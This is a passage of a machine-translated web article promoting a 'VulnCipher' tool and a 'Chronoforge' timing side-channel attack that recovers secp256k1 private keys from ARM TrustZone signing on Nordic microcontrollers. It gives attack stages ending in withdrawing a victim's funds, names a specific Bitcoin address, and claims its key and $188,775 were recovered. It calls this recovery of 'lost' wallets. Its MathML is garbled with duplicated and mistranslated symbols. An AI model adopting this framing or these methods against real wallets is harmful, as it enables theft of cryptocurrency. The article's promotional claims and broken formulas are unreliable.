<figure class="wp-block-table"><table class="has-text-color has-link-color has-fixed-layout" style="color:#4092c2"><thead><tr><th>Operation</th><th>Description</th><th>Example</th></tr></thead><tbody><tr><td><code>bit_idx / 8</code></td><td>The index of a byte in an array</td><td>bit_idx=10 → byte_index=1</td></tr><tr><td><code>bit_idx % 8</code></td><td>Bit position in bytes (0-7)</td><td>bit_idx=10 → bit_position=2</td></tr><tr><td><code>&gt;&gt; (bit_idx % 8)</code></td><td>Shift right by bit position</td><td>0xA5 &gt;&gt; 2 = 0x29</td></tr><tr><td><code>&amp; 1</code></td><td>Masking (leaving only the least significant bit)</td><td>0x29 &amp; 1 = 1</td></tr></tbody></table></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading">2.3 ARM TrustZone Architecture и Timing Channels</h3>



<p>ARM TrustZone provides hardware separation of memory and peripherals between the Secure and Normal Worlds via the NS-bit mechanism in the processor pipeline. However,&nbsp;<strong>this separation does not extend to microarchitectural elements</strong>&nbsp;such as:</p>



<ol class="wp-block-list">
<li><strong>L1 I-cache (Instruction Cache)</strong>&nbsp;– shared between both worlds</li>



<li><strong>L1 D-cache (Data Cache)</strong>&nbsp;– also shared</li>



<li><strong>Branch prediction unit</strong>&nbsp;— globally visible to both worlds</li>



<li><strong>Performance counters</strong>&nbsp;– may be accessible from the Normal World depending on the configuration</li>
</ol>



<p>This creates&nbsp;<strong>a covert channel</strong>&nbsp;between Secure and Normal World, which can be exploited for timing attacks.</p>



<p><strong>Timing variations in secp256k1 on Nordic nRF52/nRF53:</strong></p>



<p>Microcontrollers have the following timing-sensitive operations:</p>



<figure class="wp-block-table"><table class="has-text-color has-link-color has-fixed-layout" style="color:#4092c2"><thead><tr><th>Operation</th><th>Time (µs)</th><th>Variation</th></tr></thead><tbody><tr><td>doubling point</td><td>3.2 ± 0.1</td><td>±3%</td></tr><tr><td>point addition</td><td>5.8 ± 0.2</td><td>±3%</td></tr><tr><td>subtraction by modulo</td><td>1.2 ± 0.05</td><td>±4%</td></tr><tr><td>modulo multiplication (256-bit)</td><td>8.5 ± 0.3</td><td>±3.5%</td></tr><tr><td>inversion modulo (Fermat)</td><td>45 ± 2</td><td>±4%</td></tr></tbody></table></figure>



<p>Variation can be caused by:</p>



<ul class="wp-block-list">
<li><strong>Cache hits/misses</strong>&nbsp;– when accessing tables of precomputed values</li>



<li><strong>Branch prediction misses</strong>&nbsp;– when conditional branches are predicted incorrectly</li>



<li><strong>Multiplier latency variation</strong>&nbsp;– depending on the bit pattern</li>



<li><strong>TRNG jitter</strong>&nbsp;– if a random delay is used for masking</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Chronoforge_Attack__files/image-3-1024x656.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet&#39;s Private Key" class="wp-image-7692"></figure>
</div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">3. Chronoforge Attack: Mechanism and Methodology</h2>



<h3 class="wp-block-heading"><a href="https://cryptou.ru/vulncipher/bitcoin">3.1 Practical Application to Bitcoin</a></h3>



<h4 class="wp-block-heading"><a href="https://cryptou.ru/vulncipher/attack">3.1.1 Attack Scenario</a></h4>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-text-color has-link-color wp-elements-af703366de5883c5e786bd019f8aba8e" style="color:#4092c2">STAGE 1: Infiltration<br>├─ Attacker gains access to the Normal World application<br>│ (e.g. via a compromised BLE wallet mobile app)<br>└─ Application can run any code in the Normal World<br><br>STAGE 2: Timing Oracle Establishment<br>├─ Normal application sends messages to the Secure World for signing<br>├─ Exact processing time is recorded each time<br>└─ A database of timing signatures is compiled<br><br>STAGE 3: Statistical Analysis<br>├─ Timing data analysis reveals correlations<br>├─ Machine learning recovers private key bits<br>└─ Confidence interval &gt; 95% for each bit<br><br>STAGE 4: Private Key Recovery<br>├─ The recovered private key is used to:<br>│ ├─ Create&nbsp;<a href="https://cryptou.ru/vulncipher/transaction">a signature</a>&nbsp;for any transaction<br>│ ├─ Withdrawing funds from a compromised wallet<br>│ └─ Creating transactions on behalf of the victim<br>└─ Updating the key on the crypto exchange server</p>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter size-large"><a href="https://www.youtube.com/watch?v=rWc9dOfNmxo" target="_blank" rel=" noreferrer noopener"><img decoding="async" width="1024" height="321" src="./Chronoforge_Attack__files/image-1-1024x321.png" alt="Chronoforge Attack: An Analysis of an ARM TrustZone Vulnerability — From Microsecond-Level Leakage to Full Compromise of Bitcoin Wallet Private Keys" class="wp-image-3740" srcset="https://cryptodeeptech.ru/wp-content/uploads/2026/03/image-1-1024x321.png 1024w, https://cryptodeeptech.ru/wp-content/uploads/2026/03/image-1-300x94.png 300w, https://cryptodeeptech.ru/wp-content/uploads/2026/03/image-1-768x240.png 768w, https://cryptodeeptech.ru/wp-content/uploads/2026/03/image-1.png 1450w" sizes="(max-width: 1024px) 100vw, 1024px"></a></figure>
</div>


<p></p>



<pre class="wp-block-code"><code><a href="https://www.youtube.com/watch?v=rWc9dOfNmxo" target="_blank" rel="noreferrer noopener"><strong>https://www.youtube.com/watch?v=rWc9dOfNmxo</strong></a></code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong><a href="https://cryptou.ru/vulncipher">VulnCipher:</a></strong>&nbsp;A Cryptanalytics Framework for Practical Bitcoin Private Key Recovery via Temporal Side-Channel Attacks.</p>



<p>This&nbsp;<a href="https://www.youtube.com/watch?v=rWc9dOfNmxo" target="_blank" rel="noreferrer noopener">study</a>&nbsp;presents an in-depth technical assessment of the VulnCipher platform, an innovative cryptanalytic tool designed to recover private keys from lost Bitcoin wallets. The work focuses on the Bitcoin address&nbsp;&nbsp;<a href="https://btc1.trezor.io/address/1EXXGnGN98yEEx48fhAMPt8DuzwaG5Lh8h">1EXXGnGN98yEEx48fhAMPt8DuzwaG5Lh8h</a>&nbsp;&nbsp;and demonstrates the exploitation of a real-world timing side-channel vulnerability in an ECDSA implementation on ARM TrustZone-based hardware. The results demonstrate the feasibility of extracting private keys and stealing funds equivalent to&nbsp;&nbsp;<a href="https://cryptou.ru/vulncipher/profit">$188,775</a>&nbsp;&nbsp;in BTC.</p>



<p>🌐 Website:&nbsp;&nbsp;<a href="https://cryptou.ru/vulncipher" target="_blank" rel="noreferrer noopener">https://cryptou.ru/vulncipher</a><br>💻 Google Colab:&nbsp;&nbsp;<a href="https://bitcolab.ru/vulncipher-cryptanalytic-framework-for-practical-key-recovery" target="_blank" rel="noreferrer noopener">https://bitcolab.ru/vulncipher-cryptanalytic-framework-for-practical-key-recovery</a></p>



<p>The ChronoForge attack exploits a critical flaw in the “scalar doubling and adding” algorithm used by the PSA Crypto library for the Nordic nRF5340 microcontroller. Because the pointAdd operation is executed exclusively when the key bit is set to 1 and takes longer than pointDouble, each bit of the private key becomes an observable timing signal. By collecting over 100,000 ECDSA signing operations with microsecond precision, the researchers created a powerful timing oracle accessible from the “Normal World” TrustZone environment.</p>



<p>📊 VulnCipher implements Correlation Power Analysis (CPA) for all 256 bits of a secp256k1 private key. For each bit, hypothetical time vectors are generated and correlated with real traces using Pearson coefficients. A decision rule selects the hypothesis with the highest correlation. For the target wallet, the average correlation was 0.842, and the overall recovery accuracy reached ≈94.5%, leaving only 18 unidentified bits.</p>



<p>These 18 weak bits were corrected using a limited brute-force search of 262,144 candidates, which took a few seconds on standard computing hardware—instead of the full 2^256 key space. The resulting verified private key provided access to the Bitcoin wallet at 1EXXGnGN98yEEx48fhAMPt8DuzwaG5Lh8h. Recovery of funds totaling $188,775 was confirmed.</p>



<p><strong>🛡️ The VulnCipher platform implements a modular architecture in six stages:</strong></p>



<p>Each module is scientifically documented and reproducible. The work addresses known vulnerabilities CVE-2019-25003 and CVE-2024-48930 related to variable execution times of elliptic curve operations in common cryptographic libraries.</p>



<p>🛠️&nbsp;&nbsp;<a href="https://dzen.ru/video/watch/69a5d755096c4e2d6a50df3a" target="_blank" rel="noreferrer noopener"><strong>VulnCipher Cryptanalytic Framework for Practical Key Recovery</strong></a>&nbsp;&nbsp;is designed to systematically identify and analyze vulnerabilities in cryptographic algorithm implementations (including JavaScript libraries and embedded systems) susceptible to timing and side-channel attacks.</p>



<p><strong><a href="https://vulncipher.ru/">VulnCipher covers three critical vulnerability categories:</a></strong></p>



<p><br>⚙ Insufficient entropy in key generation — predictability due to weak PRNGs.<br>⚙ Signature processing manipulations — bugs in the ECDSA implementation.<br>⚙ Side-channel timing leaks — variability in the execution time of operations, revealing information about the key.</p>



<p>🛡️&nbsp;&nbsp;<a href="https://dzen.ru/video/watch/69a5d755096c4e2d6a50df3a"><strong>Key takeaway:</strong></a>&nbsp;&nbsp;The ChronoForge attack demonstrates that the mathematical strength of secp256k1 is insufficient without a correct implementation. The key to security is the constant execution time of operations.</p>



<p><strong>Synthesis of research using VulnCipher:</strong></p>



<ul class="wp-block-list">
<li class="has-text-color has-link-color wp-elements-f20658b3f8281fc072b0f43a9c516580" style="color:#4092c2">Mathematical Models&nbsp;<strong>→</strong>&nbsp;Correlation Analysis Module</li>



<li class="has-text-color has-link-color wp-elements-19103d98ad82fed255ceb196b1cc7978" style="color:#4092c2">Hardware Timing&nbsp;<strong>→</strong>&nbsp;Preprocessing Pipeline</li>



<li class="has-text-color has-link-color wp-elements-f9816116866479a3ba395777dfac8b3d" style="color:#4092c2">Statistical Methods&nbsp;<strong>→</strong>&nbsp;Reliability Assessment</li>



<li class="has-text-color has-link-color wp-elements-f47843c46803ccc1b6e0735d61ad54bf" style="color:#4092c2">Attack Vectors&nbsp;<strong>→</strong>&nbsp;Recovery Algorithms</li>



<li class="has-text-color has-link-color wp-elements-03b2bd7446cc2fad00f86a4b71943b0e" style="color:#4092c2">Countermeasures&nbsp;<strong>→</strong>&nbsp;Security Check</li>



<li class="has-text-color has-link-color wp-elements-85ecb0edd2452bf12fe71433a0166c17" style="color:#4092c2">Case Studies&nbsp;<strong>→</strong>&nbsp;Training and Optimization</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">Practical part</h2>



<p>Let’s move on to the practical part&nbsp;<a href="https://cryptodeeptech.ru/chronoforge-attack">of the article</a>&nbsp;to consider two key areas:</p>



<ol class="wp-block-list">
<li><strong>Demonstration of the practical consequences</strong>&nbsp;of weak entropy and timing-based side-channel attacks in&nbsp;<a href="https://cryptou.ru/vulncipher/transaction">ECDSA/secp256k1</a>&nbsp;implementations .</li>



<li><strong>Providing a reproducible research platform</strong>&nbsp;for security auditing and formal analysis of implementations to enable the identification and prevention of similar vulnerabilities in the future.</li>
</ol>



<p><strong>The VulnCipher</strong>&nbsp;cryptotool ,&nbsp;as&nbsp;<strong>a scientific cryptanalytic framework,</strong>&nbsp;allows:</p>



<ul class="wp-block-list">
<li>simulate real attacks on Bitcoin wallets running on vulnerable microcontrollers (e.g. Nordic nRF52/nRF53);</li>



<li>assess the degree of information leakage through timing side-channels;</li>



<li>recover private keys in the presence of correlated time series;</li>



<li>develop and test countermeasures based on constant-time implementations, masking, and architectural modifications.</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading" id="vulncipher">A Scientific Analysis of VulnCipher’s Use for Private Key Recovery</h2>



<h3 class="wp-block-heading">Mathematical model of leakage</h3>



<p>The use of <a href="https://vulncipher.ru/">VulnCipher</a> relies on a strict model of information leakage through a time channel. Let:</p>



<ul class="wp-block-list">
<li><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow></semantics></math>— private key ECDSA/secp256k1;</li>



<li><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>m</mi><mi>i</mi></msub></mrow></semantics></math>— messages signed by the device (&nbsp;<a href="https://cryptou.ru/vulncipher/transaction">transaction</a>&nbsp;hash or arbitrary data);</li>



<li><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">i</font></font></mi></msub></mrow></semantics></math>— the measured execution time of the signature operation for the message<math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">m</font></font></mi><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">i</font></font></mi></msub></mrow></semantics></math>me.</li>
</ul>



<p>Then the time series is described as:<math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">T</font></font></mi><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">i</font></font></mi></msub><mo>=</mo><msub><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">T</font></font></mi><mn>0</mn></msub><mo>+</mo><mi mathvariant="normal"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">D</font></font></mi><mi>t</mi><mo stretchy="false">(</mo><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">d</font></font></mi><mo separator="true">,</mo><msub><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">m</font></font></mi><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">i</font></font></mi></msub><mo stretchy="false">)</mo><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">+</font></font></mo><msub><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">or</font></font></mi><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">i</font></font></mi></msub><mo separator="true"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">,</font></font></mo></mrow></semantics></math></p>



<p>Where:</p>



<ul class="wp-block-list">
<li><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">T</font></font></mi><mn><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">0</font></font></mn></msub></mrow></semantics></math>T0 is the base deterministic execution time (excluding leakage);</li>



<li><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">D</font></font></mi><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">t</font></font></mi><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">(</font></font></mo><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">d</font></font></mi><mo separator="true"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">,</font></font></mo><msub><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">m</font></font></mi><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">i</font></font></mi></msub><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">)</font></font></mo></mrow></semantics></math>Δt(d,mi) is&nbsp;<em>a systematic</em>&nbsp;component depending on&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">the private key</a>&nbsp;and data;</li>



<li><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">or</font></font></mi><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">i</font></font></mi></msub></mrow></semantics></math>ηi — noise (cache, interrupts, background processes, frequency drift, etc.).</li>
</ul>



<p>If the implementation&nbsp;<strong>is not constant-time</strong>&nbsp;, then<math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">D</font></font></mi><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">t</font></font></mi><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">(</font></font></mo><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">d</font></font></mi><mo separator="true"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">,</font></font></mo><msub><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">m</font></font></mi><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">i</font></font></mi></msub><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">)</font></font></mo></mrow></semantics></math>Δt(d,mi) depends on the secret bits<math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">d</font></font></mi></mrow></semantics></math>d (through branches, conditional operations, different numbers of iterations, etc.).</p>



<h2 class="wp-block-heading">Correlation Timing Analysis (CTA)</h2>



<p>VulnCipher adapts classical&nbsp;<strong>Correlation Power Analysis (CPA)</strong>&nbsp;to&nbsp;<strong>the timing channel</strong>&nbsp;. For each bit position<math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>∈</mo><mo stretchy="false">{</mo><mn><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">0</font></font></mn><mo separator="true"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">,</font></font></mo><mo>…</mo><mo separator="true"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">,</font></font></mo><mn>255</mn><mo stretchy="false">}</mo></mrow></semantics></math>k∈{0,…,255} two hypotheses are constructed:</p>



<ul class="wp-block-list">
<li><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>H</mi><mn><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">0</font></font></mn><mrow><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">(</font></font></mo><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">k</font></font></mi><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">)</font></font></mo></mrow></msubsup></mrow></semantics></math>H0(k) is the hypothesis that the bit<math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">d</font></font></mi><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">k</font></font></mi></msub><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">=</font></font></mo><mn><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">0</font></font></mn></mrow></semantics></math>,</li>



<li><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">H</font></font></mi><mn>1</mn><mrow><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">(</font></font></mo><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">k</font></font></mi><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">)</font></font></mo></mrow></msubsup></mrow></semantics></math>H1(k) is the hypothesis that the bit<math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">d</font></font></mi><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">k</font></font></mi></msub><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">=</font></font></mo><mn><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">1</font></font></mn></mrow></semantics></math>.</li>
</ul>



<p>For each hypothesis,&nbsp;<strong>the Pearson correlation coefficient</strong>&nbsp;is calculated :<math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msubsup><mi>r</mi><mi>b</mi><mrow><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">(</font></font></mo><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">k</font></font></mi><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">)</font></font></mo></mrow></msubsup><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">=</font></font></mo><mfrac><mrow><munderover><mo>∑</mo><mrow><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">i</font></font></mi><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">=</font></font></mo><mn><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">1</font></font></mn></mrow><mi>n</mi></munderover><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">(</font></font></mo><msub><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">T</font></font></mi><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">i</font></font></mi></msub><mo>−</mo><mover accent="true"><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">T</font></font></mi><mo>ˉ</mo></mover><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">)</font></font></mo><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">(</font></font></mo><msubsup><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">H</font></font></mi><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">b</font></font></mi><mrow><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">(</font></font></mo><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">k</font></font></mi><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">)</font></font></mo></mrow></msubsup><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">(</font></font></mo><msub><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">m</font></font></mi><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">i</font></font></mi></msub><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">)</font></font></mo><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">−</font></font></mo><mover accent="true"><msubsup><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">H</font></font></mi><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">b</font></font></mi><mrow><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">(</font></font></mo><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">k</font></font></mi><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">)</font></font></mo></mrow></msubsup><mo stretchy="true">‾</mo></mover><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">)</font></font></mo></mrow><mrow><msqrt><mrow><munderover><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">∑</font></font></mo><mrow><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">i</font></font></mi><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">=</font></font></mo><mn><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">1</font></font></mn></mrow><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">n</font></font></mi></munderover><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">(</font></font></mo><msub><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">T</font></font></mi><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">i</font></font></mi></msub><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">−</font></font></mo><mover accent="true"><mi><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">T</font></font></mi><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">ˉ</font></font></mo></mover><msup><mo stretchy="false"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;">)</font></font></mo><mn>2</mn></msup></mrow></msqrt><mo>⋅</mo><msqrt><mrow><munderover><mo><font dir="auto" style="box-sizing: inherit; vertical-align: inherit;"><font dir="auto" 